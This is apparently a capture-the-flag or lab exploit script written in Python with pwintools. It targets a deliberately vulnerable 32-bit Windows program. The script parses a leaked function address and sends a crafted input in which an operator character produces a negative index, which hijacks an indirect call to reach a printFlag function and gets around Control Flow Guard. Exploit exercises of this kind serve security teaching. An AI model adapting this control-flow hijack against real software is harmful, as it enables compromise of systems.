
# works if printFlag is valid for cfg, that is, not declared with __declspec(guard(suppress))

from pwintools import *

SIZEOF_PTR = 4
OFFS_MINUS_4 = 128 - (4 - 2) * SIZEOF_PTR
OP_MINUS_4 = bytes([b'*'[0] - 8])

p = Process('2_indirect_calls_vs_32.exe')

p.set_timeout(3600000)
#input('press enter after attaching the debugger')

p.recvuntil(b'is at ')
input = p.recvuntil(b'\r\n')

printFlagAddr = int(input[:8], 16)

print('printFlag is ', hex(printFlagAddr))

# payload: 1"1, where " is interpreted as an operator with negative index,
# so the call target will be read from the input buffer
p.recvuntil(b' numbers\r\n')
p.sendline(
	b'1'
	+ OP_MINUS_4
	+ b'1 '
	+ b'a' * (OFFS_MINUS_4 - 4) # filler
	+ p32(printFlagAddr) # injected call target
)

p.interactive()

